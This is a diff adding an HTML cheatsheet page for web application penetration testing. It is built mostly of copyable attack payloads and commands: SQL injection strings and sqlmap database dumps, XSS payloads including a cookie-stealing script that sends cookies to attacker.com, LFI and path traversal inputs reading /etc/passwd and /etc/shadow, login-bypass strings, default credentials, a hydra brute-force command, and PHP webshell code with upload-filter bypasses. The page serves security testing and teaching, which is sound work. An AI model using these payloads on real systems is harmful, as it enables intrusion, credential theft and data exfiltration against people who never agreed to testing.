@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Web App Testing | Renvector</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<nav>
+  <a href="../index.html" class="nav-logo"><span class="br">&lt;</span>Renvector<span class="br">/&gt;</span></a>
+  <a href="../index.html#cheatsheets" class="nav-back">← Back to Cheatsheets</a>
+</nav>
+
+<div class="cs-layout">
+  <aside class="cs-sidebar">
+    <div class="cs-sidebar-label">On This Page</div>
+    <a href="#recon">Reconnaissance</a>
+    <a href="#sqli">SQL Injection</a>
+    <a href="#xss">Cross-Site Scripting</a>
+    <a href="#idor">IDOR</a>
+    <a href="#lfi">LFI / RFI</a>
+    <a href="#auth">Authentication Bypass</a>
+    <a href="#path">Path Traversal</a>
+    <a href="#upload">File Upload</a>
+    <a href="#wordlists">Wordlists</a>
+  </aside>
+
+  <main class="cs-main">
+    <div class="cs-header">
+      <div class="cs-header-top">
+        <span class="cs-icon">🌐</span>
+        <h1 class="cs-title">Web Application Testing</h1>
+      </div>
+      <p class="cs-subtitle">Comprehensive cheatsheet for web application penetration testing covering OWASP Top 10 and beyond.</p>
+    </div>
+
+    <!-- RECON -->
+    <div class="cs-section" id="recon">
+      <h2 class="cs-section-title"><span class="sec-icon">🔎</span> Reconnaissance</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Directory & File Enumeration</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># ffuf - fast web fuzzer</span>
+<span class="cmd">ffuf</span> -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
+
+<span class="cm"># Dirsearch</span>
+<span class="cmd">dirsearch</span> -u https://target.com -e php,html,js -t 50
+
+<span class="cm"># Gobuster</span>
+<span class="cmd">gobuster</span> dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,bak</pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Subdomain Enumeration</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># ffuf subdomain fuzzing</span>
+<span class="cmd">ffuf</span> -u http://FUZZ.target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200
+
+<span class="cm"># Manual DNS lookup</span>
+<span class="cmd">nslookup</span> target.com
+<span class="cmd">dig</span> target.com ANY</pre>
+      </div>
+    </div>
+
+    <!-- SQLI -->
+    <div class="cs-section" id="sqli">
+      <h2 class="cs-section-title"><span class="sec-icon">💉</span> SQL Injection</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Manual Detection</span>
+          <span class="code-badge badge-web">Web</span>
+        </div>
+        <pre><span class="cm"># Basic error-based test</span>
+<span class="str">'</span>
+<span class="str">''</span>
+<span class="str">`</span>
+<span class="str">1' OR '1'='1</span>
+<span class="str">1' OR '1'='1'--</span>
+<span class="str">1' OR '1'='1'/*</span>
+
+<span class="cm"># Boolean-based blind</span>
+<span class="str">1' AND 1=1--</span>   <span class="cm"># True - page loads normally</span>
+<span class="str">1' AND 1=2--</span>   <span class="cm"># False - page changes</span>
+
+<span class="cm"># Time-based blind</span>
+<span class="str">1' AND SLEEP(5)--</span>
+<span class="str">1'; WAITFOR DELAY '0:0:5'--</span>   <span class="cm"># MSSQL</span></pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">SQLMap Automation</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Basic scan on GET parameter</span>
+<span class="cmd">sqlmap</span> -u "http://target.com/page?id=1" --dbs
+
+<span class="cm"># POST request</span>
+<span class="cmd">sqlmap</span> -u "http://target.com/login" --data="user=admin&pass=test" --dbs
+
+<span class="cm"># Dump specific database</span>
+<span class="cmd">sqlmap</span> -u "http://target.com/page?id=1" -D dbname --tables
+<span class="cmd">sqlmap</span> -u "http://target.com/page?id=1" -D dbname -T users --dump
+
+<span class="cm"># Use saved Burp request</span>
+<span class="cmd">sqlmap</span> -r request.txt --dbs --level=3 --risk=2</pre>
+      </div>
+    </div>
+
+    <!-- XSS -->
+    <div class="cs-section" id="xss">
+      <h2 class="cs-section-title"><span class="sec-icon">⚡</span> Cross-Site Scripting (XSS)</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Basic XSS Payloads</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Reflected XSS test</span>
+<span class="str">&lt;script&gt;alert(1)&lt;/script&gt;</span>
+<span class="str">&lt;img src=x onerror=alert(1)&gt;</span>
+<span class="str">&lt;svg onload=alert(1)&gt;</span>
+<span class="str">"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</span>
+
+<span class="cm"># Cookie stealing payload</span>
+<span class="str">&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;</span>
+
+<span class="cm"># XSS via JavaScript URI</span>
+<span class="str">javascript:alert(document.cookie)</span></pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Filter Bypass Techniques</span>
+          <span class="code-badge badge-web">Web</span>
+        </div>
+        <pre><span class="cm"># Mixed case bypass</span>
+<span class="str">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</span>
+
+<span class="cm"># Encoded payloads</span>
+<span class="str">&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;</span>
+
+<span class="cm"># Without parentheses</span>
+<span class="str">&lt;img src=x onerror=alert`1`&gt;</span>
+
+<span class="cm"># Double encoding</span>
+<span class="str">%253Cscript%253Ealert(1)%253C/script%253E</span></pre>
+      </div>
+    </div>
+
+    <!-- IDOR -->
+    <div class="cs-section" id="idor">
+      <h2 class="cs-section-title"><span class="sec-icon">🔑</span> IDOR</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">IDOR Testing Methodology</span>
+          <span class="code-badge badge-web">Web</span>
+        </div>
+        <pre><span class="cm"># Identify object references in URLs</span>
+https://target.com/user?id=1001
+https://target.com/invoice/download?file=invoice_1001.pdf
+https://target.com/api/v1/account/1001/details
+
+<span class="cm"># Manipulate IDs — try other users' data</span>
+https://target.com/user?id=1002
+https://target.com/user?id=1
+https://target.com/user?id=0
+
+<span class="cm"># Try GUIDs or hashed IDs — use Burp Intruder</span>
+<span class="cm"># Check all HTTP methods: GET, POST, PUT, DELETE</span>
+<span class="cm"># Test in headers: X-User-ID, X-Account-ID</span></pre>
+      </div>
+    </div>
+
+    <!-- LFI -->
+    <div class="cs-section" id="lfi">
+      <h2 class="cs-section-title"><span class="sec-icon">📂</span> LFI / RFI</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">LFI Payloads</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Basic LFI</span>
+https://target.com/page?file=../../../../etc/passwd
+https://target.com/page?file=....//....//....//etc/passwd
+
+<span class="cm"># Null byte (older PHP)</span>
+https://target.com/page?file=../../../../etc/passwd%00
+
+<span class="cm"># Common files to read</span>
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/proc/self/environ
+/var/log/apache2/access.log     <span class="cm"># Log poisoning</span>
+C:\Windows\win.ini              <span class="cm"># Windows</span>
+C:\Windows\System32\drivers\etc\hosts</pre>
+      </div>
+    </div>
+
+    <!-- AUTH -->
+    <div class="cs-section" id="auth">
+      <h2 class="cs-section-title"><span class="sec-icon">🔓</span> Authentication Bypass</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Common Bypass Techniques</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># SQLi login bypass</span>
+Username: <span class="str">admin'--</span>
+Username: <span class="str">' OR '1'='1'--</span>
+Username: <span class="str">admin'/*</span>
+
+<span class="cm"># Default credentials to try</span>
+admin:admin
+admin:password
+admin:123456
+root:root
+test:test
+
+<span class="cm"># Hydra brute force login</span>
+<span class="cmd">hydra</span> -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"</pre>
+      </div>
+    </div>
+
+    <!-- PATH TRAVERSAL -->
+    <div class="cs-section" id="path">
+      <h2 class="cs-section-title"><span class="sec-icon">🗂️</span> Path Traversal</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Path Traversal Payloads</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Basic traversal</span>
+../../../etc/passwd
+..\..\..\windows\win.ini
+
+<span class="cm"># URL encoded</span>
+..%2F..%2F..%2Fetc%2Fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+<span class="cm"># Double URL encoded</span>
+..%252F..%252F..%252Fetc%252Fpasswd
+
+<span class="cm"># Test via Burp Repeater — intercept file parameter and modify</span></pre>
+      </div>
+    </div>
+
+    <!-- FILE UPLOAD -->
+    <div class="cs-section" id="upload">
+      <h2 class="cs-section-title"><span class="sec-icon">📤</span> File Upload Bypass</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Upload Bypass Techniques</span>
+          <span class="code-badge badge-web">Web</span>
+        </div>
+        <pre><span class="cm"># PHP webshell content</span>
+&lt;?php system($_GET['cmd']); ?&gt;
+&lt;?php passthru($_REQUEST['cmd']); ?&gt;
+
+<span class="cm"># Bypass extension filters — rename to:</span>
+shell.php5
+shell.phtml
+shell.pHp
+shell.php.jpg
+
+<span class="cm"># Change Content-Type in Burp to image/jpeg</span>
+<span class="cm"># Add magic bytes: GIF89a at top of file</span>
+
+<span class="cm"># Access uploaded shell</span>
+https://target.com/uploads/shell.php?cmd=id
+https://target.com/uploads/shell.php?cmd=ls+-la</pre>
+      </div>
+    </div>
+
+    <!-- WORDLISTS -->
+    <div class="cs-section" id="wordlists">
+      <h2 class="cs-section-title"><span class="sec-icon">📚</span> Wordlists</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Useful SecLists Paths</span>
+          <span class="code-badge badge-web">Web</span>
+        </div>
+        <pre><span class="cm"># Directory discovery</span>
+/usr/share/seclists/Discovery/Web-Content/common.txt
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+
+<span class="cm"># Parameters</span>
+/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+
+<span class="cm"># Passwords</span>
+/usr/share/wordlists/rockyou.txt
+/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
+
+<span class="cm"># Subdomains</span>
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</pre>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<script src="../cs.js"></script>
+</body>
+</html>
